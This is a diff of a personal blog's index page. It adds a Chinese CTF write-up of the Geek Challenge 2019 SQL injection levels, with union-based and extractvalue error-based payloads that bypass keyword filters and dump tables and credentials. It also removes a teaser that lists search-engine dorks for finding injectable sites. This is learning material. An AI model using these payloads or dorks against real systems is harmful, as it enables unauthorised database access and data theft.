@@ -178,6 +178,129 @@
             
 
   
+    <article id="post-极客大挑战sql注入篇" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+  
+  
+    <h1 itemprop="name">
+	
+	  <a class="article-title" href="/2021/11/26/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98sql%E6%B3%A8%E5%85%A5%E7%AF%87/" target="_blank">极客大挑战sql注入篇</a>
+  
+    </h1>
+  
+
+
+  
+  
+<a href="/2021/11/26/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98sql%E6%B3%A8%E5%85%A5%E7%AF%87/" class="archive-article-date">
+        <time datetime="2021-11-26T13:27:03.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-11-26</time>
+</a>
+
+  
+  
+    
+
+  
+  </header>
+  
+  <div class="article-entry" itemprop="articleBody">
+    
+    <h1 id="极客大挑战-2019-EasySQL"><a href="#极客大挑战-2019-EasySQL" class="headerlink" title="[极客大挑战 2019]EasySQL"></a>[极客大挑战 2019]EasySQL</h1><p>1.先试一下万能钥匙，提示密码的单引号没有闭合。<br><img src="https://i.loli.net/2021/11/27/6rLJqu5OXY8lQED.png" alt="image.png"><br><img src="https://i.loli.net/2021/11/27/SCG3MFvAZy4hjdV.png" alt="image.png"></p>
+<p>2.在密码前添加单引号，得到flag。<br><img src="https://i.loli.net/2021/11/27/sOKFn79tLquboHB.png" alt="image.png"><br><img src="https://i.loli.net/2021/11/27/fHemuEvLqpyGNo8.png" alt="image.png"></p>
+<h1 id="极客大挑战-2019-BabySQL"><a href="#极客大挑战-2019-BabySQL" class="headerlink" title="[极客大挑战 2019]BabySQL"></a>[极客大挑战 2019]BabySQL</h1><p>1.试一下万能钥匙，反馈得到or好像被注释掉了，再把or换成and也是同样的结果。<br><img src="https://i.loli.net/2021/11/27/l7MXd9bTismA2Lw.png" alt="image.png"></p>
+<p>2.试一下双写，再补一下密码前的单引号，成功进入得到用户名为admin。<br><img src="https://i.loli.net/2021/11/27/CiuHa3hcr7FqM1B.png" alt="image.png"><br><img src="https://i.loli.net/2021/11/27/Wo4XEwyvCuLIhq8.png" alt="image.png"></p>
+<p>3.再使用一下and双写，把用户名前面的1改为admin，成功进入。<br><img src="https://i.loli.net/2021/11/27/H9TGCcnSFxvpjzR.png" alt="image.png"><br><img src="https://i.loli.net/2021/11/27/Wo4XEwyvCuLIhq8.png" alt="image.png"></p>
+<p>4.直接使用order by语句报错，可以的到里面的or和by都被过滤掉，在把这两个双写，当order by后面数字为3成功进入，为4则报错，因此判断有三列。<br><img src="https://i.loli.net/2021/11/27/dp6VTaWSncPDfZu.png" alt="image.png"></p>
+<p>5.使用联合查询注入。</p>
+<pre><code>-admin&#39;  uniounionn  seleselectct  1,2,3#
+</code></pre>
+<p><img src="https://i.loli.net/2021/11/27/Nog6BTJsxLPc3dr.png" alt="image.png"></p>
+<pre><code> 查表名
+ -admin&#39;  ununionion  seleselectct  1,2,group_concat(table_name) frfromom infoorrmation_schema.tables whwhereere table_schema=database() #
+</code></pre>
+<p><img src="https://i.loli.net/2021/11/27/lu4CZxrfc8KINHL.png" alt="image.png"></p>
+<pre><code> 查表名
+ -admin&#39;  ununionion  seleselectct  1,2,group_concat(column_name) frfromom infoorrmation_schema.columns whwhereere table_schema=database() #
+</code></pre>
+<p><img src="https://i.loli.net/2021/11/27/BqK3OSPzHY1iuep.png" alt="image.png"></p>
+<pre><code> 查一下b4bsql这个表里的值
+ -admin&#39;  ununionion  seleselectct  1,2,group_concat(id,username,passwoorrd) frfromom b4bsql #
+</code></pre>
+<p><img src="https://i.loli.net/2021/11/27/GYHfCAz14VnBiOb.png" alt="image.png"><br>爆出flag</p>
+<h1 id="极客大挑战-2019-HardSQL"><a href="#极客大挑战-2019-HardSQL" class="headerlink" title="[极客大挑战 2019]HardSQL"></a>[极客大挑战 2019]HardSQL</h1><p>1.试一下万能钥匙，得不到反馈，猜测可能是盲注。<br><img src="https://i.loli.net/2021/11/27/d9KNVnYoyiGc7Aa.png" alt="image.png"></p>
+<p>2.使用Fuzz字典和burp suite测试下被过滤了什么<br><img src="https://s2.loli.net/2022/01/01/LOr7mthMglwbIZJ.png" alt="image.png"><br>根据response判断：</p>
+<p>回显“你可别被我逮住了，臭弟弟”为被过滤的字符；</p>
+<p>状态为429的为表示在一定的时间内用户发送了太多的请求，即超出了“频次限制”；</p>
+<p>可得长度为751的为可使用的字符<br><img src="https://s2.loli.net/2022/01/01/hx7PturIOCNAneW.png" alt="image.png"></p>
+<p>3.在使用盲注之前先试一下extractvalue()函数能不能回显。</p>
+<pre><code>?username=1&#39;^extractvalue(1,concat(0x7e,(select(database()))))%23&amp;password=1
+</code></pre>
+<p><img src="https://i.loli.net/2021/11/27/jfoTRJbN1PLIvKs.png" alt="image.png"></p>
+<p>4.接着继续使用sql注入</p>
+<p>查表名：</p>
+<pre><code>?username=-1&#39;^extractvalue(1,concat(1,(select(table_name)from(information_schema.tables)where(table_schema)like(&#39;geek&#39;))))%23&amp;password=&#39;123
+</code></pre>
+<p>查列名：</p>
+<pre><code>?username=-1&#39;^extractvalue(1,concat(1,(select(group_concat(column_name))from(information_schema.columns)where(table_name)like(&#39;H4rDsq1&#39;))))%23&amp;password=&#39;123
+</code></pre>
+<p><img src="https://s2.loli.net/2022/01/01/cjbQRkuglKJZG5y.png" alt="image.png"><br>爆flag</p>
+<pre><code>?username=-1&#39;^extractvalue(1,concat(1,(select(group_concat(id,&#39;~&#39;,username,&#39;~&#39;,password))from(H4rDsq1))))%23&amp;password=&#39;123
+</code></pre>
+<p><img src="https://s2.loli.net/2022/01/01/epclIkD8nYPXL5G.png" alt="image.png"></p>
+<ul>
+<li><p>因为extactvalue函数回显的数字限制只回显一半的flag，所有要用left或right函数修改一下payload去掉重复的，拼接起来就是flag</p>
+<pre><code>  ?username=-1&#39;^extractvalue(1,concat(1,(select(right(password,35))from(H4rDsq1))))%23&amp;password=&#39;123
+</code></pre>
+</li>
+</ul>
+<p><img src="https://s2.loli.net/2022/01/01/oVwimK8GCnZH6Qd.png" alt="image.png"></p>
+
+    
+
+    
+
+    
+
+  </div>
+  <div class="article-info article-info-index">
+    
+    
+    
+
+    
+    <p class="article-more-link">
+      <a class="article-more-a" href="/2021/11/26/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98sql%E6%B3%A8%E5%85%A5%E7%AF%87/">展开全文 >></a>
+    </p>
+    
+
+    
+    <div class="clearfix"></div>
+  </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
     <article id="post-攻防世界WEB新手区11、12" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
@@ -916,85 +1039,6 @@ ORDER BY 列名（，列名...）[ASC|DESE]
 
 
   
-    <article id="post-sqli注入流程笔记" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-  
-  
-    <h1 itemprop="name">
-	
-	  <a class="article-title" href="/2021/10/07/sqli%E6%B3%A8%E5%85%A5%E6%B5%81%E7%A8%8B%E7%AC%94%E8%AE%B0/" target="_blank">sql注入一般流程（学习笔记）</a>
-  
-    </h1>
-  
-
-
-  
-  
-<a href="/2021/10/07/sqli%E6%B3%A8%E5%85%A5%E6%B5%81%E7%A8%8B%E7%AC%94%E8%AE%B0/" class="archive-article-date">
-        <time datetime="2021-10-07T14:58:23.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-10-07</time>
-</a>
-
-  
-  
-    
-
-  
-  </header>
-  
-  <div class="article-entry" itemprop="articleBody">
-    
-    <h1 id="sql注入一般流程"><a href="#sql注入一般流程" class="headerlink" title="sql注入一般流程"></a>sql注入一般流程</h1><h2 id="（1）目标收集"><a href="#（1）目标收集" class="headerlink" title="（1）目标收集"></a>（1）目标收集</h2><p>a.无特定目标inurl:.php?id=//注意php前有一个小点</p>
-<p>b.有特定目标inurl:.php?id=sit:target.com</p>
-<p>c.工具爬取spider，对收索引擎和目标网站的链接经行爬取</p>
-    
-    <a class="article-more-a" href="/2021/10/07/sqli%E6%B3%A8%E5%85%A5%E6%B5%81%E7%A8%8B%E7%AC%94%E8%AE%B0/#more">more >></a>
-    
-    
-
-    
-
-    
-
-  </div>
-  <div class="article-info article-info-index">
-    
-    
-    
-
-    
-    <p class="article-more-link">
-      <a class="article-more-a" href="/2021/10/07/sqli%E6%B3%A8%E5%85%A5%E6%B5%81%E7%A8%8B%E7%AC%94%E8%AE%B0/">展开全文 >></a>
-    </p>
-    
-
-    
-    <div class="clearfix"></div>
-  </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
   
     <nav id="page-nav">
       <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="extend next" rel="next" href="/page/2/">Next &amp;raquo;</a>
@@ -1009,7 +1053,7 @@ ORDER BY 列名（，列名...）[ASC|DESE]
   <div class="outer">
     <div id="footer-info">
     	<div class="footer-left">
-    		&copy; 2018-2021 <a href="http://example.com/" target="_blank">00hello00</a>
+    		&copy; 2018-2022 <a href="http://example.com/" target="_blank">00hello00</a>
     	</div>
       	<div class="footer-right">
 			
